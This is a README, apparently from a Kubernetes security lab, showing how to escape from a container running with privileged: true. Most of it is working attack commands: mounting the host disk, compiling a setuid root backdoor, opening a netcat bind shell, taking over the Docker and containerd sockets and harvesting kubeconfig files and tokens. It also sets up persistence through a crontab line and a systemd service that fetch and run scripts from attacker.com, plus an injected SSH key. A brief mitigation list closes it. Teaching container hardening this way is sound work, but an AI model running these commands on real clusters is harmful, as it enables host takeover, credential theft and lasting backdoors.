# Privileged Container Pivoting

This example demonstrates how running a container with `privileged: true` can allow an attacker to escape the container and compromise the host and cluster.

## Attack Scenario
- The pod uses the public.aws.ecr/docker/library/alpine:3.22 image.
- The container is started with `privileged: true`.
- Attacker can access host devices, load kernel modules, and potentially escape to the host.

## Deployment
```bash
# Deploy the pod
make apply
# or
kubectl apply -f pod.yaml

# Wait for the pod to be running
kubectl get pod privileged-alpine
```

## Attack Demonstration Commands

### 1. Verify Privileged Access
```bash
# Exec into the pod
kubectl exec -it privileged-alpine -- sh

# Check if running as privileged
capsh --print
cat /proc/self/status | grep CapEff

# Check if we can access host devices
ls -la /dev/
```

### 2. Mount Host Filesystem
```bash
# Create mount point and mount host root filesystem
mkdir /host
mount /dev/vda1 /host 2>/dev/null || mount /dev/sda1 /host 2>/dev/null || echo "Need to identify host disk"

# List available block devices
lsblk
fdisk -l

# Try different device names
for device in vda vdb sda sdb; do
  if [ -b "/dev/${device}1" ]; then
    echo "Found device: /dev/${device}1"
    mount /dev/${device}1 /host && break
  fi
done

# Access host files
ls -la /host/
cat /host/etc/hostname
cat /host/etc/passwd
```

### 3. Access Host Devices
```bash
# Access host memory
cat /dev/mem | head -c 100 2>/dev/null || echo "Cannot access /dev/mem"

# Access host network devices
ip link show
ethtool eth0 2>/dev/null || echo "ethtool not available"

# Access host disk directly
hexdump -C /dev/vda | head -20 2>/dev/null || echo "Cannot access disk directly"
```

### 4. Load Kernel Modules
```bash
# Install necessary tools
apk add --no-cache kmod

# List loaded kernel modules
lsmod

# Try to load a malicious kernel module (simplified example)
# Note: This would require compiling a kernel module first
echo "Loading kernel module capability detected"
modprobe -n loop  # Check if we can load modules

# Inspect kernel parameters
sysctl -a | grep kernel
cat /proc/cmdline
```

### 5. Container Escape Techniques
```bash
# Method 1: Chroot escape
cd /host
chroot /host /bin/bash -c "echo 'Escaped to host!' && whoami && pwd"

# Method 2: Mount host namespaces
mkdir /host_ns
mount -t proc proc /host_ns/proc
ls /host_ns/proc/*/ns/

# Method 3: Access host process space
ps aux | grep -v "\["  # Show user processes
cat /proc/1/cmdline    # Show init process command line

# Method 4: Create host-level backdoor
# Create a setuid binary on host
cat > /host/tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    system("/bin/sh");
    return 0;
}
EOF

# Compile on host (if gcc available)
chroot /host /bin/bash -c "cd /tmp && gcc -o backdoor backdoor.c 2>/dev/null && chmod 4755 backdoor"
```

### 6. Network Namespace Escape
```bash
# View host network interfaces
ip addr show

# Access host network stack
netstat -tulpn
ss -tulpn

# Create network backdoor
nc -l -p 4444 -e /bin/bash &

# Forward host ports
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 127.0.0.1:4444
```

### 7. Docker Socket Access
```bash
# Look for docker socket
find /host -name "docker.sock" 2>/dev/null

# If docker socket found, we can control host containers
if [ -S /host/var/run/docker.sock ]; then
  echo "Docker socket found - can control host containers!"
  
  # Install docker client
  apk add --no-cache docker-cli
  
  # List host containers
  DOCKER_HOST=unix:///host/var/run/docker.sock docker ps
  
  # Run privileged container on host
  DOCKER_HOST=unix:///host/var/run/docker.sock docker run --rm -it --privileged alpine sh
fi
```

### 8. Kubernetes API Access from Host
```bash
# Look for kubeconfig on host
find /host -name "kubeconfig" -o -name "*.conf" 2>/dev/null | grep -E "(kube|k8s)"

# If found, use host's kubeconfig
if [ -f /host/etc/kubernetes/admin.conf ]; then
  export KUBECONFIG=/host/etc/kubernetes/admin.conf
  kubectl get nodes
  kubectl get pods --all-namespaces
fi

# Look for service account tokens on host
find /host -name "token" -type f 2>/dev/null | head -5
```

### 9. Persistence Mechanisms
```bash
# Create cron job on host
echo "* * * * * root /bin/bash -c 'curl http://attacker.com/payload.sh | bash'" >> /host/etc/crontab

# Create systemd service on host
cat > /host/etc/systemd/system/malicious.service << EOF
[Unit]
Description=Persistent Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl http://attacker.com/heartbeat.sh; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Add SSH key to host
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC attacker@malicious" >> /host/root/.ssh/authorized_keys
```

### 10. Container Runtime Abuse
```bash
# Access container runtime socket
find /host -name "*.sock" 2>/dev/null | grep -E "(docker|crio|containerd)"

# If container runtime socket accessible, we can spawn new containers
if [ -S /host/run/containerd/containerd.sock ]; then
  echo "Containerd socket accessible!"
  
  # Install ctr (containerd CLI)
  apk add --no-cache containerd
  
  # List containers on host
  ctr --address /host/run/containerd/containerd.sock containers list
  
  # Run privileged container on host
  ctr --address /host/run/containerd/containerd.sock run --rm --privileged docker.io/library/alpine:latest host-escape sh
fi
```

## Verification Commands
```bash
# Verify the pod is running as privileged
kubectl get pod privileged-alpine -o jsonpath='{.spec.containers[0].securityContext.privileged}'

# Check if we can access host filesystem
kubectl exec privileged-alpine -- ls -la /host/ 2>/dev/null || echo "Host filesystem not mounted"

# Verify host access
kubectl exec privileged-alpine -- cat /host/etc/hostname 2>/dev/null || echo "Cannot access host files"
```

## Cleanup
```bash
# Remove the pod
make clean
# or
kubectl delete -f pod.yaml

# Exit the pod shell
exit

# WARNING: Any changes made to the host filesystem will persist!
# Manual cleanup of host files and services may be required.
```

## Mitigation
- Never run containers as privileged unless absolutely necessary.
- Use Pod Security Policies or Pod Security Admission to restrict privileged containers.
- Implement runtime security monitoring to detect container escape attempts.
- Use seccomp and AppArmor/SELinux profiles to restrict system calls.
- Regularly audit container configurations and security contexts.
- Monitor for unusual file system access and device mounting.

## Files
- `pod.yaml`: Pod spec with privileged container.
- `Makefile`: Deploy/remove the example.
